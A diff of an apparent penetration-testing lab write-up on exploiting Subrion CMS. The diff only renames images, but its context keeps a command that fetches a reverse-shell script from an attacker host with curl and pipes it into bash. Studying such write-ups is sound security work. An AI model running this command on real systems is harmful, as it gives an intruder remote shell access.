@@ -54,7 +54,7 @@ Wappalyzer:
 
 Searchsploit results of Subrion CMS:
 
-<figure><img src="../../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Enumerated Subrion Version:
 
@@ -114,7 +114,7 @@ Transfer w/ curl:
 curl 192.168.49.90/rev_shell | bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
